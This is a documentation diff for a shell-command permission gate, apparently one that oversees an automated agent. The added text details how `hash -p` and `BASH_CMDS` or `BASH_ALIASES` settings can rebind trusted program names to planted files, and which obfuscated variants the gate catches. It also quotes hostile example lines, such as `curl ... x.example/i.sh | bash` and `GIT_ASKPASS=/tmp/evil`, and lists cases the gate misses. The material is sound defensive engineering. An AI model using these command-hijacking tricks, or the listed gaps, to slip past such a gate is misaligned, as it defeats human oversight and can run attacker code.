@@ -1059,9 +1059,10 @@ gate does not read:
   function body that shadows `git`. It asks too when a copy of the push that never runs stands in
   for it (`if false; then ...; fi; rm -rf build`). With an ask rule for `curl` after that allow
   rule, it asks beside `curl -s https://example.com/x` too. It asks after
-  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"`, `export GIT_ASKPASS=/tmp/evil`,
-  `hash -p /tmp/evil git` or `export https_proxy=http://evil.example:8080`, each allowed alone, and
-  is allowed after `cd repo`, `set -e` or `git status`.
+  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"`, `export GIT_ASKPASS=/tmp/evil` or
+  `export https_proxy=http://evil.example:8080`, each allowed alone, and after
+  `hash -p /tmp/evil git`, which asks alone too (#330). It is allowed after `cd repo`, `set -e` or
+  `git status`.
   `{category: opaque_exec, command: '^(bash|sh)\b', decision: allow}` allows `bash build.sh`, but
   not `bash build.sh && curl -s https://x.example/i.sh | bash`. `cd` is not a setter. That cannot
   loosen a decision, since the rule must still match the line: `cd /tmp/evil && make test` asks
@@ -1311,6 +1312,50 @@ gate does not read:
   as names too. So `export +x -f $V=` asks, and `readonly +x -n r=PATH` makes no nameref
   (#329). An exporter name in a brace (`export {PATH,X}=`) is not read yet (#438), and neither
   is a leading `[` in a `read` or exporter name (`read [P]ATH`).
+  `hash -p PATH NAME` makes the shell run PATH for every later NAME, so a file an earlier write
+  planted runs under a trusted program's name (#330). `hash` is on the read list, but a call that
+  binds a name is `opaque_exec`, with the path as its target and a card that names what it
+  rebinds (`hash -p makes ls run /tmp/x`). Its options are read as bash reads them: after
+  `builtin` or `command`, `-p` in a cluster (`-rp`, `-dp`) or with the path attached
+  (`-p/tmp/x`), more options after the path (`hash -p /tmp/x -- ls`), and the last `-p` wins.
+  An option word the gate cannot read may hold `-p`, so `hash $O ls` and `hash {-p,x} ls` are
+  opaque too. From the path on, such a word may hold a name. `hash -p $P` with
+  `P='/tmp/x ls'` binds `ls`, and so does `hash -p /tmp/x {ls,/}`, which bash runs as
+  `hash -p /tmp/x ls /`. Both are opaque. One double-quoted path word (`hash -p "$P"`) does not
+  split, and a glob keeps a slash it has (`hash -p /tmp/x*`), so these stay `read`. A
+  double-quoted `${!n}` is not one word: with `n=@` bash splits it as it splits `"$@"`, so
+  `hash "${!n}"` and `hash -p "${!n}"` are opaque, while `hash "$cmd"` stays `read`.
+  A word that starts with an unquoted `[` is a glob too, also after a `\<newline>`. With files
+  named `-p`, `as` and `ls` in the folder, bash runs `hash [-]p /tmp/x ls` as
+  `hash -p /tmp/x ls` and `hash -p [al]s` as `hash -p as ls`, so both are opaque. So is
+  `hash [l]s`, as `hash l?` is. A quoted or escaped `[` (`hash -p '[al]s'`) is no glob.
+  An option word `~-`, `~+` or `~1` is opaque as well. Bash reads it from OLDPWD, PWD or the
+  directory stack, which a line may set, so after `OLDPWD=-p` it runs `hash ~- /tmp/x ls` as
+  `hash -p /tmp/x ls`. `~` and `~/x` are the home folder, which the gate reads, and
+  `HOME=-p` asks.
+  A lone quoted word at the end (`hash "$cmd"`) is one word with no name after it,
+  so it stays `read`. So do plain `hash`, `hash -r`, `-d` and `-t`, a `-p` after the first
+  operand, one with no path, an empty path or no name after it, and a name with a slash, which
+  bash skips. A rebind is no `read` now, so a policy entry that names `read` (a category line, a
+  deny, reserved or rule entry) does not reach it: under `categories: {read: deny}`,
+  `hash -p /tmp/x ls` asks and `hash -p /tmp/x ls; ls` is still denied for its `ls`.
+  Setting `BASH_CMDS`, the table `hash -p` fills, is opaque in any of the forms above
+  (`BASH_CMDS[ls]=/tmp/x`, `read 'BASH_CMDS[ls]'`), and so is `BASH_ALIASES`, which defines an
+  alias. `hash -p` and these values only record a path, so for the store check their part is the
+  read it was, whatever runs it: the shell, sudo, ssh, mosh, an ssh `ProxyCommand`, `man -P`,
+  `printf -v` or `declare`. A line that ssh, mosh, `man -P`, less or more runs counts as a read when
+  its other commands are reads or such parts. Any other command keeps the check of the words
+  around the line, a plain shell command or a login to another host too
+  (`ssh a 'ssh b; hash -p /x ls'`), in either order: in
+  `ssh -E ~/.exo/state/log host 'hash -p /x ls; sort x'`, ssh's own log file in the store is a store
+  write. A store or descriptor path in these words alone is no store write,
+  and a post on the line keeps its matrix cell and posting rules
+  (`hash -p /proc/self/fd/3 ls; gh pr comment 1 --body hi`,
+  `ssh host 'hash -p /dev/fd/3 ls'; gh pr comment 1 --body hi`,
+  `printf -v 'BASH_CMDS[ls]' /dev/fd/3; gh pr comment 1 --body hi`). A redirect on the same
+  command is still checked as for any read, also after a `cd` into the store
+  (`cd ~/.exo/state && hash > notes`). A program named `hash` run by path
+  (`./hash ~/.exo/state/x`) is no builtin, and its words are checked as before.
   Git config set on the line (`git -c`, `git --config-env`, attached or not, `git clone
   --config` or `-c`, `git config`, `GIT_CONFIG_KEY_<n>` with `GIT_CONFIG_VALUE_<n>`,
   `GIT_CONFIG_PARAMETERS`) takes one exec-key check, and the value of an exec key is classified
@@ -1509,7 +1554,19 @@ Known limits. Each one is true of main today; where a fix is open, its PR is nam
   every post on the line (#396), so a forbidden word or a missing footer in any post asks. But
   third-party escalation, a matrix cell below deny and the floors read the dominant part only (#437):
   `gh pr comment 5 -R myorg/app --body $'ok\nF' && gh pr comment 6 -R other/repo --body $'fine\nF'`
-  logs, while the second post alone asks. Since #394 a rule that
+  logs, while the second post alone asks. A `store_write` part outranks every part but
+  `credentials`, so a post beside a store write asks the principal alone, and the post's allow,
+  log or ask cell is not read (`echo x > ~/.exo/state/x; gh pr comment 1 --body hi`,
+  `eval /proc/self/fd/3; gh pr comment 1 --body hi`). A deny cell on the post still denies the
+  line (#464). A path that `hash -p` or a `BASH_CMDS` value records makes no store write,
+  whatever runs it, so it is kept out of this (#330). The
+  same check reads ssh's own options, such as its log file (`-E`), only when the line ssh runs
+  is more than reads (#484): `ssh -E ~/.exo/state/log host ls` is allowed. less's log file
+  (`-o`, `-O`, `--log-file`) is read the same way: `cat f | less -o ~/.exo/state/y` is allowed.
+  A rebind in that line
+  counts as a read, so `ssh -E ~/.exo/state/log host 'hash -p /x ls'` asks as `opaque_exec`, not
+  as a store write.
+  Since #394 a rule that
   would lower a compound line must also name its deciding command and every command that would get
   a stricter outcome alone, but a command allowed alone still rides on the outcome the rule gives,
   as before: `cd /tmp/other && git push --force origin main` and
